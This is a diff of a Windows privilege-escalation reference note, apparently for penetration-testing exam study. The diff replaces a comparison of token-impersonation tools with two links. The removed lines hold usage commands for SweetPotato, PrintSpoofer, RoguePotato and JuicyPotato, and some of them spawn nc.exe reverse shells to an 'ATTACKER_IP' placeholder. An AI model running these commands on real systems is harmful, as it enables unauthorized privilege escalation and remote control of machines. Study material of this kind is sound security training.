@@ -1,27 +1,12 @@
 # Windows Privilege Escalation Reference
 
-Extended reference for Windows privesc. For core commands and checklist, see [[Windows Privilege Escalation]] and [[CHECKLIST-Windows-Privesc]].
+Extended reference for Windows privesc. For core commands and checklist, see [[Windows Privilege Escalation]].
 
-## Token Impersonation Tools Comparison
+## SeImpersonatePrivilege
 
-**SweetPotato (Recommended - Most Compatible):**
-- Works: Windows 7-11, Server 2008-2022
-- Most reliable for OSCP
-- Usage: `.\SweetPotato.exe -p .\nc.exe -a "IP PORT -e cmd.exe"`
+Refer to https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
-**PrintSpoofer (Server 2016/2019):**
-- More stable on newer Windows Server
-- Requires Print Spooler service running
-- Usage: `.\PrintSpoofer64.exe -i -c "whoami"`
-
-**RoguePotato (Windows 10 1809+, Server 2019+):**
-- Newer systems only
-- Usage: `.\RoguePotato.exe -r ATTACKER_IP -e "C:\nc.exe ATTACKER_IP PORT -e cmd.exe" -l 9999`
-
-**JuicyPotato (Older Windows):**
-- Windows 7, 8, Server 2008, 2012
-- Requires specific CLSID for OS version
-- Usage: `.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *`
+https://github.com/Flangvik/SharpCollection
 
 ## Privilege Groups
 
